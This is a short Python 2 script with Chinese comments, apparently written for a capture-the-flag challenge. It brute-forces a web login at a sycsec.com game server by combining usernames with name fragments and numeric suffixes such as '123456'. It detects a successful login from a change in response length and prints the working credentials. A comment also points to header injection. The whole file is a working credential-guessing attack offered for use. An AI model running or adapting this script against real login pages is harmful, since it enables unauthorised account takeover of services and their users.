#! /usr/bin/env python
# coding=utf-8

# 导入包requests包（群里有）
import requests
# 创建会话
s = requests.Session()

# 设置请求的url
url = "http://game.sycsec.com:2001/"

# 设置用户名
name = ["admin", "adminstrator", "lichao", "LICHAO", "admin", "li", "chao", "CHAO", "LI"]

# 密码=namelist[i]+numlist[j]
namelist = ["", "admin", "adminstrator", "lichao", "lc", "LC", "Lc", "LICHAO", "LI", "CHAO", "li", "chao"]
numlist = ["", "123", "1234", "12345", "123456", "1234567", "12345678", "LI", "CHAO", "li", "chao"]

for na in name:
    for n in namelist:
        for num in numlist:
            # 组合密码
            pwd = n + str(num)
            # 将密码和用户名写进字典
            payload = {'name': na, 'pass': pwd}
            # 获取post之后的数据放在r里，如果是get方式就用get，如果头部还有cookies之类的也可以填入header(可以用于http包头注入)，
            # post(url, data=paylaod, header=someheader)
            r = s.post(url, data=payload)
            # 这个地址请求回复的网页只有230，如果不等于230则打印密码和用户名
            if len(r.content) != 230:
                print "密码:{0:>20}用户名:{1}".format(pwd, na)
